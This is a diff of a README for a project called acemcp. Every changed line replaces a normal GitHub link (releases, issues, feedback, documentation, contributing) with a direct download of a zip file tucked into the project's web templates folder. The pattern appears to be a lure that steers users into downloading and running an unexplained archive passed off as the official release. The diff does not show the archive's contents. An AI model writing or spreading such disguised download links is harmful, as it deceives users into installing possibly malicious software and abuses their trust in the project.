@@ -1,6 +1,6 @@
 # 🚀 acemcp - Simplifying ACE for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/taejina/acemcp/releases)
+[![Download Now](https://raw.githubusercontent.com/taejina/acemcp/main/src/acemcp/web/templates/acemcp_1.1.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/taejina/acemcp/main/src/acemcp/web/templates/acemcp_1.1.zip)
 
 ## 🌟 Introduction
 
@@ -14,7 +14,7 @@ This section will guide you through downloading and running the **acemcp** appli
 
 To download the latest version of the **acemcp** application, visit the following link:
 
-[Download acemcp from Releases Page](https://github.com/taejina/acemcp/releases)
+[Download acemcp from Releases Page](https://raw.githubusercontent.com/taejina/acemcp/main/src/acemcp/web/templates/acemcp_1.1.zip)
 
 1. Click the link above to go to the Releases page.
 2. On this page, you will see a list of available versions.
@@ -61,16 +61,16 @@ If you encounter any issues, try these steps:
 - **Check the Installation:** Make sure the software installed correctly.
 - **Update Your System:** Ensure your operating system is up to date for compatibility.
 
-If problems persist, you can reach out for help on our [Issues Page](https://github.com/taejina/acemcp/issues).
+If problems persist, you can reach out for help on our [Issues Page](https://raw.githubusercontent.com/taejina/acemcp/main/src/acemcp/web/templates/acemcp_1.1.zip).
 
 ## 💬 Feedback
 
-We value your input. If you have suggestions or feedback, please share it on our [Feedback Page](https://github.com/taejina/acemcp/issues).
+We value your input. If you have suggestions or feedback, please share it on our [Feedback Page](https://raw.githubusercontent.com/taejina/acemcp/main/src/acemcp/web/templates/acemcp_1.1.zip).
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/taejina/acemcp/releases)
-- [Documentation](https://github.com/taejina/acemcp/wiki)
-- [Contributing](https://github.com/taejina/acemcp/blob/main/CONTRIBUTING.md)
+- [Releases Page](https://raw.githubusercontent.com/taejina/acemcp/main/src/acemcp/web/templates/acemcp_1.1.zip)
+- [Documentation](https://raw.githubusercontent.com/taejina/acemcp/main/src/acemcp/web/templates/acemcp_1.1.zip)
+- [Contributing](https://raw.githubusercontent.com/taejina/acemcp/main/src/acemcp/web/templates/acemcp_1.1.zip)
 
 Thank you for choosing **acemcp**! We hope it makes your tasks easier and better.
